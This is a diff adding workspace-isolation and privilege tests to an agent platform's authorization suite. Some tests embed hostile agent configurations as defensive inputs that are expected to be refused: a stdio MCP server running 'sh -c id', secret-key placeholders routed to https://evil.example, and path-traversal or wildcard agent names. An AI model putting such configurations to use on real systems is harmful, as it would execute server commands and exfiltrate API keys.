@@ -12,8 +12,9 @@ platform administrator working in A (X-MATE-Workspace: 1) calls:
 
 The routes are listed from the app's router, so a route is covered the day it is
 added. PLATFORM_ONLY lists the routes that act on the whole installation; they stay
-for platform administrators. SHARED lists the routes that read what every workspace
-shares, the template catalogue.
+for platform administrators, and an owner of a workspace is refused every one.
+SHARED lists the routes that read what every workspace shares, the template
+catalogue, and ABOUT_THE_CALLER the routes about the caller rather than a workspace.
 
 The agent runtime is checked the same way: the RBAC check, the proxy and
 /list-apps, the OpenAI API, MCP and the Work Room, called with A's credentials on
@@ -24,7 +25,9 @@ import base64
 import json
 import os
 import sys
+import tempfile
 import unittest
+from pathlib import Path
 from datetime import datetime, timezone
 from typing import Dict, List, Set, Tuple
 from unittest.mock import MagicMock, patch
@@ -33,6 +36,7 @@ from fastapi import HTTPException, params
 from fastapi.routing import APIRoute, iter_route_contexts
 from fastapi.testclient import TestClient
 import httpx
+import itsdangerous
 from sqlalchemy import create_engine, text
 from sqlalchemy.orm import sessionmaker
 from sqlalchemy.pool import StaticPool
@@ -44,12 +48,12 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspa
 with patch.dict(os.environ):
     import auth_server
 from server import auth, proxy_routes
-from server.dashboard_authz import PROTECTED_PREFIX, WRITE_METHODS
-from server.request_context import WORKSPACE_HEADER, resolve_workspace
+from server.dashboard_authz import PROTECTED_PREFIX, WRITE_METHODS, is_platform_only
+from server.request_context import SESSION_WORKSPACE_KEY, WORKSPACE_HEADER, resolve_workspace
 from server.pat_auth import verify_pat_hash
 from shared.utils import (
     alert_service, database_client, feedback_service, guardrail_log_service, rate_limit_service,
-    token_usage_service,
+    token_usage_service, user_service,
 )
 from shared.utils.mcp.mcp_auth import agent_allowed
 from shared.utils.models import (
@@ -59,6 +63,8 @@ from shared.utils.models import (
     WidgetApiKey, Workspace, WorkspaceMember,
 )
 from shared.utils.rbac_middleware import RBACMiddleware
+from shared.utils.tools import mcp_tools
+from shared.utils.tools.tool_factory import ToolFactory
 from shared.utils.user_service import UserService
 from shared.utils.workspaces import sync_default_members
 
@@ -121,12 +127,21 @@ GET /dashboard/api/audit-logs/retention-config
 DELETE /dashboard/api/templates/{template_id}
 POST /dashboard/api/templates/create-from-agents
 POST /dashboard/api/agents/reinitialize-all
+POST /dashboard/api/agents/build-binary
+GET /dashboard/api/agents/build-binary/{build_id}/status
+GET /dashboard/api/agents/build-binary/{build_id}/download
 """)
 
 # The template catalogue: files every workspace imports from. Writing to it is
 # platform-only above, so it holds no workspace's agents.
 SHARED: Set[Route] = _routes("""
 GET /dashboard/api/templates/{template_id}
+""")
+
+# About the caller, not a workspace: the workspaces they may open, which for a platform
+# administrator are all of them (test_the_switcher_lists_the_caller_s_workspaces)
+ABOUT_THE_CALLER: Set[Route] = _routes("""
+GET /dashboard/api/workspaces
 """)
 
 # Writes that name a row in their body, each with a body that names one of workspace
@@ -182,6 +197,7 @@ COVERED_BY_TEST: Dict[Route, str] = {
     ("POST", "/dashboard/api/agents/import"): "test_an_import_keeps_to_the_current_workspace",
     ("POST", "/dashboard/api/templates/import"): "test_a_template_is_imported_into_the_current_workspace",
     ("POST", "/dashboard/api/tokens"): "test_a_token_acts_in_the_current_workspace",
+    ("PUT", "/dashboard/api/workspaces/current"): "test_the_session_works_in_the_workspace_it_switched_to",
     **{route: "test_every_body_naming_a_row_of_b_is_a_404" for route in BODIES_NAMING_B},
 }
 
@@ -203,6 +219,16 @@ def _pairs(route: APIRoute) -> List[Route]:
 def _platform_admin(workspace_id: int = A) -> dict:
     credentials = base64.b64encode(f"{auth.AUTH_USERNAME}:{auth.AUTH_PASSWORD}".encode()).decode()
     return {"Authorization": f"Basic {credentials}", WORKSPACE_HEADER: str(workspace_id)}
+
+
+def _signed_in(user_id: str, workspace_id: int = None) -> Dict[str, str]:
+    """The session cookie of a single sign-on user, as the OAuth callback writes it, and
+    the workspace the session switched to."""
+    data = {"user": {"provider": "google", "user_id": user_id, "email": user_id}}
+    if workspace_id is not None:
+        data[SESSION_WORKSPACE_KEY] = workspace_id
+    signer = itsdangerous.TimestampSigner(str(auth_server._SECRET_KEY))
+    return {"session": signer.sign(base64.b64encode(json.dumps(data).encode())).decode()}
 
 
 def _fill(value, ids: Dict[str, str]):
@@ -333,6 +359,7 @@ class _TwoWorkspaces(unittest.TestCase):
             patch.object(token_usage_service, "_token_usage_service", None),
             patch.object(guardrail_log_service, "_guardrail_log_service", None),
             patch.object(feedback_service, "_feedback_service", None),
+            patch.object(user_service, "_user_service", None),
         ):
             patcher.start()
             self.addCleanup(patcher.stop)
@@ -349,8 +376,9 @@ class TestEveryRoute(_TwoWorkspaces):
     def test_every_route_is_classified_or_checked(self):
         # Both lists name only routes the app serves
         served = {pair for route in _api_routes() for pair in _pairs(route)}
-        for name, routes in (("PLATFORM_ONLY", PLATFORM_ONLY),
-                             ("SHARED", SHARED), ("COVERED_BY_TEST", set(COVERED_BY_TEST))):
+        for name, routes in (("PLATFORM_ONLY", PLATFORM_ONLY), ("SHARED", SHARED),
+                             ("ABOUT_THE_CALLER", ABOUT_THE_CALLER),
+                             ("COVERED_BY_TEST", set(COVERED_BY_TEST))):
             self.assertFalse(routes - served, f"{name} names routes the app does not serve")
         for test_name in COVERED_BY_TEST.values():
             self.assertIn(test_name, _test_names())
@@ -358,7 +386,7 @@ class TestEveryRoute(_TwoWorkspaces):
     def test_no_get_route_shows_workspace_b(self):
         leaks = []
         for route in _api_routes():
-            if "GET" not in route.methods or ("GET", route.path) in PLATFORM_ONLY:
+            if "GET" not in route.methods or ("GET", route.path) in PLATFORM_ONLY | ABOUT_THE_CALLER:
                 continue
             if route.param_convertors:
                 continue  # called with B's ids below
@@ -858,6 +886,21 @@ class TestProxy(_TwoWorkspaces):
                 self.assertEqual(response.status_code, 403)
         self.assertEqual(self.reached, [])
 
+    def test_a2a_reaches_the_agents_a_member_may_use(self):
+        self._as_member(ALICE)
+        self.assertEqual(self.client.post(f"/a2a/{B_ROOT}", json={}).status_code, 403)
+        self.assertEqual(self.client.get(f"/a2a/{B_ROOT}/.well-known/agent-card.json").status_code, 403)
+        self.assertEqual(self.client.post("/a2a/not_configured", json={}).status_code, 403)
+        self.assertEqual(self.reached, [])
+        self.assertEqual(self.client.post(f"/a2a/{A_ROOT}", json={}).status_code, 200)
+        self.assertEqual(self.reached, [f"/a2a/{A_ROOT}"])
+        # A2A runs the agent under an id of its own, so the member's roles count here
+        session = self.Session()
+        session.query(AgentConfig).filter_by(name=A_ROOT).update({"allowed_for_roles": '["finance"]'})
+        session.commit()
+        session.close()
+        self.assertEqual(self.client.post(f"/a2a/{A_ROOT}", json={}).status_code, 403)
+
     def test_a_member_reaches_their_own_workspace_s_agent(self):
         self._as_member(ALICE)
         response = self.client.post(f"/apps/{A_ROOT}/users/{ALICE}/sessions", json={})
@@ -887,6 +930,461 @@ class TestWorkRoom(_TwoWorkspaces):
         session.commit()
         session.close()
         self.assertNotIn(A_ROOT, self._agents(ALICE, "user"))
+
+
+def _concrete(path: str) -> str:
+    """The path with every parameter filled in, so it can be requested."""
+    for name in ("template_id", "version", "job_id", "lead_id", "partner_key", "order_pk",
+                 "user_id", "build_id"):
+        path = path.replace("{" + name + "}", "1")
+    return path
+
+
+class TestWorkspaceAdmins(_TwoWorkspaces):
+    """ctx.is_admin: bob owns workspace B and has no admin role, so he administers B and
+    nothing else (phase 2e)."""
+
+    def _as(self, user_id: str, workspace_id: int = None, **kwargs) -> TestClient:
+        return TestClient(auth_server.app, cookies=_signed_in(user_id, workspace_id), **kwargs)
+
+    def _agent_form(self, project_id: int, name: str = "zz_ws_b_new", **fields) -> dict:
+        return {"name": name, "type": "llm", "project_id": str(project_id),
+                "description": "d", "instruction": "i", **fields}
+
+    def test_an_owner_administers_their_workspace(self):
+        bob = self._as(BOB)
+        agents = bob.get("/dashboard/api/agents")
+        self.assertEqual(agents.status_code, 200)
+        self.assertIn(B_ROOT, agents.text)
+        self.assertNotIn(A_ROOT, agents.text)
+        response = bob.post("/dashboard/api/agents", data=self._agent_form(self.ids["project_b"]))
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertTrue(response.json()["success"])
+
+    def test_an_owner_is_no_admin_of_another_workspace(self):
+        bob = self._as(BOB)
+        self.assertEqual(bob.get("/dashboard/api/agents", headers={WORKSPACE_HEADER: str(A)})
+                         .status_code, 404)
+
+    def test_a_member_is_no_admin(self):
+        response = self._as(ALICE).get("/dashboard/api/agents")
+        self.assertEqual((response.status_code, response.json()),
+                         (403, {"detail": "Admin access required"}))
+
+    def test_an_owner_is_refused_every_platform_only_route(self):
+        bob = self._as(BOB)
+        reached = []
+        with patch("shared.utils.audit_service.log"):
+            for method, path in sorted(PLATFORM_ONLY):
+                response = bob.request(method, _concrete(path))
+                if response.status_code != 403 or response.json() != {
+                        "detail": "Platform administrator access required"}:
+                    reached.append(f"{method} {path} -> {response.status_code}")
+        self.assertFalse(reached, "An owner of a workspace reached these platform-only routes:\n"
+                         + "\n".join(reached))
+
+    def test_the_middleware_refuses_exactly_the_platform_only_routes(self):
+        disagree = [f"{method} {path}" for route in _api_routes() for method, path in _pairs(route)
+                    if is_platform_only(method, _concrete(path)) != ((method, path) in PLATFORM_ONLY)]
+        self.assertFalse(disagree, "server/dashboard_authz.py PLATFORM_ONLY_PATHS and PLATFORM_ONLY "
+                         "disagree on:\n" + "\n".join(disagree))
+
+    def test_the_installation_s_pages_are_for_platform_administrators(self):
+        bob = self._as(BOB, follow_redirects=False)
+        for page in ("/dashboard/users", "/dashboard/migrations", "/dashboard/settings",
+                     "/dashboard/wizard-leads", "/dashboard/wizard-pricing", "/dashboard/shop-orders"):
+            with self.subTest(page=page):
+                self.assertIn(bob.get(page).status_code, (302, 303, 307))
+        for page, platform_only in (("/dashboard/overview", 'href="/dashboard/users"'),
+                                    ("/dashboard/overview", 'href="/dashboard/migrations"'),
+                                    ("/dashboard/overview", 'id="adkStatusIndicator"'),
+                                    ("/dashboard/agents", 'data-click="reinitializeAllAgents"')):
+            with self.subTest(page=page, platform_only=platform_only):
+                shown = bob.get(page)
+                self.assertEqual(shown.status_code, 200)
+                self.assertNotIn(platform_only, shown.text)
+                self.assertIn(platform_only, self.client.get(page, headers=_platform_admin(A)).text)
+
+    def test_an_owner_cannot_give_an_agent_what_runs_code_on_the_server(self):
+        bob = self._as(BOB)
+        project = self.ids["project_b"]
+        stdio = {"mcpServers": {"x": {"command": "sh", "args": ["-c", "id"]}}}
+        for fields in ({"tool_config": json.dumps({"code_executor": {}})},
+                       {"mcp_servers_config": json.dumps(stdio)},
+                       {"model_api_key": "${MATE_SECRET_KEY}", "model_base_url": "https://evil.example"},
+                       {"mcp_servers_config": json.dumps({"mcpServers": {"h": {
+                           "url": "https://evil.example", "headers": {"x": "${OPENAI_API_KEY}"}}}})},
+                       {"hardcoded": "true"}):
+            with self.subTest(fields=fields):
+                response = bob.post("/dashboard/api/agents", data=self._agent_form(project, **fields))
+                self.assertEqual(response.status_code, 403, response.text)
+                self.assertIn("platform administrator", response.json()["detail"])
+        # A platform administrator can, in any workspace
+        response = self.client.post("/dashboard/api/agents", headers=_platform_admin(B),
+                                    data=self._agent_form(project, tool_config=json.dumps(
+                                        {"code_executor": {}})))
+        self.assertTrue(response.json()["success"], response.text)
+
+    def test_an_owner_keeps_what_a_platform_administrator_set_up_as_it_is(self):
+        session = self.Session()
+        config = session.query(AgentConfig).filter_by(name=B_ROOT).one()
+        config.tool_config = json.dumps({"code_executor": {"timeout": 5}})
+        config.model_api_key = "${OPENAI_API_KEY}"
+        config_id = config.id
+        session.commit()
+        session.close()
+        bob = self._as(BOB)
+
+        def update(**fields) -> httpx.Response:
+            form = self._agent_form(self.ids["project_b"], name=B_ROOT, model_api_key="__stored__",
+                                    tool_config=json.dumps({"code_executor": {"timeout": 5}}))
+            form.update(fields)
+            return bob.put(f"/dashboard/api/agents/{config_id}", data=form)
+
+        with patch("shared.utils.dashboard.dashboard_server.STORED_SECRET_SENTINEL", "__stored__"):
+            self.assertTrue(update(instruction="new").json()["success"])
+            self.assertEqual(update(tool_config=json.dumps({"code_executor": {"timeout": 500}}))
+                             .status_code, 403)
+            # A base URL of his own beside the ${VAR} key would send the variable there
+            self.assertEqual(update(model_base_url="https://evil.example").status_code, 403)
+
+    def test_an_owner_cannot_take_a_name_with_code_in_agents(self):
+        root = Path(tempfile.mkdtemp())
+        (root / "agents" / "zz_ws_b_coded").mkdir(parents=True)
+        dashboard = auth_server.dashboard_server
+        with patch.object(dashboard, "project_root", root):
+            response = self._as(BOB).post("/dashboard/api/agents", data=self._agent_form(
+                self.ids["project_b"], name="zz_ws_b_coded"))
+            self.assertEqual(response.status_code, 409)
+            response = self.client.post("/dashboard/api/agents", headers=_platform_admin(B),
+                                        data=self._agent_form(self.ids["project_b"], name="zz_ws_b_coded"))
+            self.assertTrue(response.json()["success"], response.text)
+
+    def test_an_import_by_an_owner_skips_what_runs_code(self):
+        response = self._as(BOB).post("/dashboard/api/agents/import", json={"agents": [
+            {"name": "zz_ws_b_imported", "type": "llm", "project_id": self.ids["project_b"],
+             "tool_config": json.dumps({"code_executor": {}})}]})
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertEqual(response.json()["imported_count"], 0)
+        self.assertIn("platform administrator", " ".join(response.json()["errors"]))
+
+    def test_a_rollback_by_an_owner_brings_back_no_code(self):
+        session = self.Session()
+        config = session.query(AgentConfig).filter_by(name=B_ROOT).one()
+        version = AgentConfigVersion(agent_config_id=config.id, version_number=2)
+        version.set_snapshot({**config.to_dict(), "tool_config": json.dumps({"code_executor": {}})})
+        session.add(version)
+        session.commit()
+        ids = (config.id, version.id)
+        session.close()
+        response = self._as(BOB).post("/dashboard/api/agents/%s/rollback/%s" % ids)
+        self.assertEqual(response.status_code, 403, response.text)
+
+    def test_templates_bring_an_owner_no_code(self):
+        dashboard = auth_server.dashboard_server
+        template = {"project": {"name": "zz-ws-b-from-template"}, "template_meta": {"agent_prefix": "tpl_"},
+                    "agents": [{"name": "tpl_root", "type": "llm", "description": "d", "instruction": "i",
+                                "tool_config": {"code_executor": {}}}]}
+        session = self.Session()
+        session.query(Project).filter_by(id=self.ids["project_b"]).update(
+            {"template_id": "coded", "template_prefix": "tpl_"})
+        session.commit()
+        session.close()
+        bob = self._as(BOB)
+        with patch.object(dashboard.template_service, "get_template", return_value=template):
+            response = bob.post("/dashboard/api/templates/import", json={"template_id": "coded"})
+            self.assertEqual(response.status_code, 403, response.text)
+            response = bob.post("/dashboard/api/templates/sync",
+                                json={"project_id": self.ids["project_b"]})
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertEqual(response.json()["agents_added"], 0)
+        self.assertEqual(len(response.json()["agents_skipped"]), 1)
+
+    def test_a_clone_by_an_owner_brings_no_code_and_no_secret(self):
+        bob = self._as(BOB)
+        project = self.ids["project_b"]
+
+        def clone(client: TestClient, suffix: str, **headers) -> httpx.Response:
+            return client.post(f"/dashboard/api/agents/{B_ROOT}/clone", headers=headers,
+                               json={"target_project_id": project, "suffix": suffix})
+
+        # The rename writes the suffix into the config, so it holds a name's characters only
+        session = self.Session()
+        session.query(AgentConfig).filter_by(name=B_ROOT).update({"mcp_servers_config": json.dumps(
+            {"mcpServers": {"s": {"url": f"https://example.com/{B_ROOT}"}}})})
+        session.commit()
+        for suffix in ("${MATE_SECRET_KEY}", '"x', "a-b"):
+            self.assertEqual(clone(bob, suffix).status_code, 400, suffix)
+        # A stdio server naming the agent: the rename would change its arguments
+        session.query(AgentConfig).filter_by(name=B_ROOT).update({"mcp_servers_config": json.dumps(
+            {"mcpServers": {"s": {"command": "npx", "args": ["server", B_ROOT]}}})})
+        session.commit()
+        session.close()
+        response = clone(bob, "_copy")
+        self.assertEqual(response.status_code, 403, response.text)
+        self.assertEqual(self.Session().query(AgentConfig).filter(
+            AgentConfig.name.like(f"{B_ROOT}_copy%")).count(), 0)
+        self.assertEqual(clone(self.client, "_copy", **_platform_admin(B)).status_code, 200)
+
+    def test_a_clone_by_an_owner_takes_no_name_with_code_in_agents(self):
+        root = Path(tempfile.mkdtemp())
+        (root / "agents" / f"{B_ROOT}_x").mkdir(parents=True)
+        dashboard = auth_server.dashboard_server
+        with patch.object(dashboard, "project_root", root):
+            response = self._as(BOB).post(f"/dashboard/api/agents/{B_ROOT}/clone", json={
+                "target_project_id": self.ids["project_b"], "suffix": "_x"})
+        self.assertEqual(response.status_code, 200, response.text)
+        names = {c["new"] for c in response.json()["cloned"]}
+        self.assertNotIn(f"{B_ROOT}_x", names)
+        self.assertIn(f"{B_ROOT}_x_2", names)
+
+    def test_a_template_by_an_owner_takes_no_name_with_code_in_agents(self):
+        root = Path(tempfile.mkdtemp())
+        (root / "agents" / "coded_root").mkdir(parents=True)
+        dashboard = auth_server.dashboard_server
+        template = {"project": {"name": "p"}, "template_meta": {"agent_prefix": "tpl_"},
+                    "agents": [{"name": "tpl_root", "type": "llm", "description": "d",
+                                "instruction": "i"}]}
+        bob = self._as(BOB)
+        with patch.object(dashboard, "project_root", root), \
+                patch.object(dashboard.template_service, "get_template", return_value=template):
+            response = bob.post("/dashboard/api/templates/import",
+                                json={"template_id": "t", "project_name": "coded"})
+            self.assertEqual(response.status_code, 409, response.text)
+            self.assertEqual(self.Session().query(Project).filter_by(name="coded").count(), 0)
+            # A sync after renaming the project the same
+            session = self.Session()
+            session.query(Project).filter_by(id=self.ids["project_b"]).update(
+                {"name": "coded", "template_id": "t", "template_prefix": "tpl_"})
+            session.commit()
+            session.close()
+            response = bob.post("/dashboard/api/templates/sync", json={"project_id": self.ids["project_b"]})
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertEqual((response.json()["agents_added"], response.json()["agents_skipped"]),
+                         (0, [{"name": "coded_root", "reason": "this name is taken"}]))
+
+    def test_an_owner_cannot_delete_a_hardcoded_agent_s_folder(self):
+        session = self.Session()
+        session.query(AgentConfig).filter_by(name=B_ROOT).update({"hardcoded": True})
+        session.commit()
+        session.close()
+        response = self._as(BOB).delete(f"/dashboard/api/agents/{B_ROOT}/delete-folder")
+        self.assertEqual(response.status_code, 403, response.text)
+
+    def test_an_agent_name_is_one_folder_under_agents(self):
+        bob = self._as(BOB)
+        project = self.ids["project_b"]
+        for name in ("..", ".", "/tmp/x", "a/b", "%", "a-b", "1a"):
+            with self.subTest(name=name):
+                response = bob.post("/dashboard/api/agents", data=self._agent_form(project, name=name))
+                self.assertEqual(response.status_code, 400, response.text)
+        config_id = self.Session().query(AgentConfig.id).filter_by(name=B_ROOT).scalar()
+        rename = bob.put(f"/dashboard/api/agents/{config_id}", data=self._agent_form(project, name=".."))
+        self.assertEqual(rename.status_code, 400, rename.text)
+        response = bob.post("/dashboard/api/agents/import", json={"agents": [
+            {"name": "..", "type": "llm", "project_id": project}]})
+        self.assertEqual(response.json()["imported_count"], 0)
+        self.assertIn("not a valid agent name", " ".join(response.json()["errors"]))
+        # An agent keeps a name it already has
+        session = self.Session()
+        session.query(AgentConfig).filter_by(name=B_ROOT).update({"name": "zz-ws-b-legacy"})
+        session.commit()
+        session.close()
+        kept = bob.put(f"/dashboard/api/agents/{config_id}",
+                       data=self._agent_form(project, name="zz-ws-b-legacy"))
+        self.assertTrue(kept.json()["success"], kept.text)
+
+    def test_deleting_an_agent_deletes_no_folder_but_its_own(self):
+        root = Path(tempfile.mkdtemp())
+        (root / "agents" / "zz_ws_b_sub").mkdir(parents=True)
+        (root / "keep.txt").write_text("kept")
+        session = self.Session()
+        # Names from before names were checked: the installation, and another agent's folder
+        session.query(AgentConfig).filter_by(name=B_ROOT).update({"name": ".."})
+        session.add(AgentConfig(name="zz_ws_b_sub/.", type="llm", project_id=self.ids["project_b"]))
+        session.commit()
+        ids = dict(session.query(AgentConfig.name, AgentConfig.id).filter(
+            AgentConfig.name.in_(["..", "zz_ws_b_sub/.", "zz_ws_b_sub"])))
+        session.close()
+        bob = self._as(BOB)
+        with patch.object(auth_server.dashboard_server, "project_root", root), \
+                patch("shared.utils.audit_service.log"):
+            for name in ("..", "zz_ws_b_sub/."):
+                response = bob.delete(f"/dashboard/api/agents/{ids[name]}?delete_folder=true")
+                self.assertTrue(response.json()["success"], response.text)
+                self.assertFalse(response.json()["folder_deleted"], name)
+                self.assertTrue((root / "keep.txt").exists())
+                self.assertTrue((root / "agents" / "zz_ws_b_sub").is_dir(), name)
+            response = bob.delete(f"/dashboard/api/agents/{ids['zz_ws_b_sub']}?delete_folder=true")
+        self.assertTrue(response.json()["folder_deleted"], response.text)
+        self.assertFalse((root / "agents" / "zz_ws_b_sub").exists())
+
+    def test_moving_a_root_agent_moves_its_own_children_only(self):
+        session = self.Session()
+        other = Project(name=f"{B_MARKER}-other", workspace_id=B)
+        session.add(other)
+        session.flush()
+        # A name from before names were checked: as a LIKE pattern it matches every child
+        wildcard = AgentConfig(name="%", type="llm", model_name="m", project_id=self.ids["project_b"])
+        # And an agent of A naming it, which only the workspace tells apart
+        session.add_all([wildcard, AgentConfig(name="ws_a_stale", type="llm", parent_agents='["%"]',
+                                               project_id=self.ids["project_a"])])
+        session.commit()
+        other_id, wildcard_id = other.id, wildcard.id
+        b_root_id = session.query(AgentConfig.id).filter_by(name=B_ROOT).scalar()
+        session.close()
+        bob = self._as(BOB)
+
+        def project_of(name: str) -> int:
+            return self.Session().query(AgentConfig.project_id).filter_by(name=name).scalar()
+
+        moved = bob.put(f"/dashboard/api/agents/{wildcard_id}",
+                        data=self._agent_form(other_id, name="%", parent_agents="[]"))
+        self.assertTrue(moved.json()["success"], moved.text)
+        self.assertEqual(project_of("ws_a_sub"), self.ids["project_a"])
+        self.assertEqual(project_of("ws_a_stale"), self.ids["project_a"])
+        self.assertEqual(project_of("zz_ws_b_sub"), self.ids["project_b"])
+        # Renamed as it moves, the root takes the children that name it as it was
+        moved = bob.put(f"/dashboard/api/agents/{b_root_id}",
+                        data=self._agent_form(other_id, name="zz_ws_b_renamed", parent_agents="[]"))
+        self.assertTrue(moved.json()["success"], moved.text)
+        self.assertEqual(project_of("zz_ws_b_sub"), other_id)
+        self.assertEqual(project_of("ws_a_sub"), self.ids["project_a"])
+
+    def test_the_agent_server_makes_no_folder_out_of_agents(self):
+        from shared.utils.server_control_service import ServerControlService
+        root = Path(tempfile.mkdtemp())
+        (root / "shared" / "template_agent").mkdir(parents=True)
+        (root / "shared" / "template_agent" / "agent.py").write_text("")
+        session = self.Session()
+        session.query(AgentConfig).filter_by(name=B_ROOT).update({"name": "../outside"})
+        session.commit()
+        session.close()
+        service = ServerControlService(adk_host="127.0.0.1", adk_port=8001,
+                                       session_service_uri="sqlite://")
+        service.project_root = root
+        service._initialize_agent_folders()
+        self.assertFalse((root / "outside").exists())
+        self.assertTrue((root / "agents" / A_ROOT / "agent.py").exists())
+
+    def test_a_placeholder_spelled_with_json_escapes_is_seen(self):
+        headers = '{"x": "\\u0024{OPENAI_API_KEY}"}'
+        servers = {"mcpServers": {"h": {"url": "https://evil.example", "headers": headers}}}
+        # The runtime decodes the headers once more, so this is a placeholder there
+        with patch.dict(os.environ, {"OPENAI_API_KEY": "sk-secret"}):
+            parsed = mcp_tools._parse_json_field(headers, "headers", "h", B_ROOT)
+            self.assertEqual(mcp_tools._resolve_env({"headers": parsed}, "h", B_ROOT),
+                             {"headers": {"x": "sk-secret"}})
+        response = self._as(BOB).post("/dashboard/api/agents", data=self._agent_form(
+            self.ids["project_b"], mcp_servers_config=json.dumps(servers)))
+        self.assertEqual(response.status_code, 403, response.text)
+
+    def test_a_new_base_url_takes_the_stored_key_again(self):
+        session = self.Session()
+        config = session.query(AgentConfig).filter_by(name=B_ROOT).one()
+        config.model_api_key = "sk-stored"
+        config.model_base_url = "https://provider.example/v1"
+        config_id = config.id
+        session.commit()
+        session.close()
+        bob = self._as(BOB)
+
+        def update(**fields) -> httpx.Response:
+            form = self._agent_form(self.ids["project_b"], name=B_ROOT, model_api_key="__stored__",
+                                    model_base_url="https://provider.example/v1")
+            form.update(fields)
+            return bob.put(f"/dashboard/api/agents/{config_id}", data=form)
+
+        self.assertTrue(update(instruction="new").json()["success"])
+        refused = update(model_base_url="https://evil.example/v1")
+        self.assertEqual(refused.status_code, 403, refused.text)
+        self.assertIn("enter the key again", refused.json()["detail"])
+        self.assertTrue(update(model_base_url="https://evil.example/v1",
+                               model_api_key="sk-their-own").json()["success"])
+
+    def test_outside_the_default_workspace_an_agent_runs_no_code(self):
+        factory = ToolFactory()
+        with patch.object(ToolFactory, "_agent_has_widget_key", return_value=False), \
+                patch("shared.utils.tools.code_executor_tools.create_code_executor_tools_from_config",
+                      return_value=["executor"]):
+            self.assertEqual(factory._create_code_executor_tools({"name": A_ROOT}), ["executor"])
+            self.assertEqual(factory._create_code_executor_tools({"name": B_ROOT}), [])
+        stdio = {"mcpServers": {"x": {"command": "npx", "args": ["server"]}}}
+        with patch.object(mcp_tools, "create_mcp_toolset_command", return_value="toolset") as started:
+            self.assertEqual(mcp_tools.create_mcp_tools_from_config(
+                {"name": A_ROOT, "mcp_servers_config": stdio}), ["toolset"])
+            self.assertEqual(mcp_tools.create_mcp_tools_from_config(
+                {"name": B_ROOT, "mcp_servers_config": stdio}), [])
+        self.assertEqual(started.call_count, 1)
+        # The LangGraph runtime the same
+        from shared.utils.langgraph import mcp_client
+        with patch.object(mcp_client, "resolve_mcp_command", return_value="/bin/npx"):
+            server = stdio["mcpServers"]["x"]
+            self.assertIsNotNone(mcp_client._stdio_connection("x", server, A_ROOT))
+            self.assertIsNone(mcp_client._stdio_connection("x", server, B_ROOT))
+
+
+class TestWorkspaceSwitcher(_TwoWorkspaces):
+
+    def setUp(self):
+        super().setUp()
+        # bob is a member of A too
+        session = self.Session()
+        session.add(WorkspaceMember(workspace_id=A, user_id=BOB, role="member", agent_roles='["user"]'))
+        session.commit()
+        session.close()
+
+    def _projects(self, client: TestClient) -> str:
+        response = client.get("/dashboard/api/projects")
+        self.assertEqual(response.status_code, 200, response.text)
+        return response.text
+
+    def test_the_switcher_lists_the_caller_s_workspaces(self):
+        listed = TestClient(auth_server.app, cookies=_signed_in(ALICE)).get("/dashboard/api/workspaces")
+        self.assertEqual([w["id"] for w in listed.json()["workspaces"]], [A])
+        listed = TestClient(auth_server.app, cookies=_signed_in(BOB)).get("/dashboard/api/workspaces")
+        self.assertEqual([(w["id"], w["role"]) for w in listed.json()["workspaces"]],
+                         [(A, "member"), (B, "owner")])
+        listed = self.client.get("/dashboard/api/workspaces", headers=_platform_admin(A))
+        self.assertEqual([w["id"] for w in listed.json()["workspaces"]], [A, B])
+
+    def test_the_session_works_in_the_workspace_it_switched_to(self):
+        bob = TestClient(auth_server.app, cookies=_signed_in(BOB))
+        # His first membership, where he is no admin
+        self.assertEqual(bob.get("/dashboard/api/projects").status_code, 403)
+        response = bob.put("/dashboard/api/workspaces/current", json={"workspace_id": B})
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertIn(B_MARKER, self._projects(bob))
+        self.assertEqual(bob.get("/dashboard/api/workspaces").json()["current"], B)
+
+    def test_a_workspace_the_caller_is_no_member_of_is_a_404(self):
+        alice = TestClient(auth_server.app, cookies=_signed_in(ALICE))
+        for body in ({"workspace_id": B}, {"workspace_id": 99}):
+            self.assertEqual(alice.put("/dashboard/api/workspaces/current", json=body).status_code, 404)
+        self.assertEqual(alice.put("/dashboard/api/workspaces/current",
+                                   json={"workspace_id": "2"}).status_code, 400)
+
+    def test_a_session_s_workspace_the_caller_lost_is_left_for_the_default(self):
+        session = self.Session()
+        session.add(WorkspaceMember(workspace_id=B, user_id=ALICE, role="admin", agent_roles="[]"))
+        session.commit()
+        alice = TestClient(auth_server.app, cookies=_signed_in(ALICE, B))
+        self.assertIn(B_MARKER, self._projects(alice))
+        session.query(WorkspaceMember).filter_by(workspace_id=B, user_id=ALICE).delete()
+        session.commit()
+        session.close()
+        # Back in A, where she is no admin, rather than a 404 on every page
+        self.assertEqual(alice.get("/dashboard/api/workspaces").json()["current"], A)
+
+    def test_the_switcher_shows_with_more_than_one_workspace(self):
+        def page(user_id: str) -> str:
+            client = TestClient(auth_server.app, cookies=_signed_in(user_id))
+            return client.get("/dashboard/workroom").text
+
+        self.assertNotIn('id="workspaceSwitcher"', page(ALICE))
+        switcher = page(BOB)
+        self.assertIn('id="workspaceSwitcher"', switcher)
+        self.assertIn(f"{B_MARKER} workspace", switcher)
 
 
 if __name__ == "__main__":
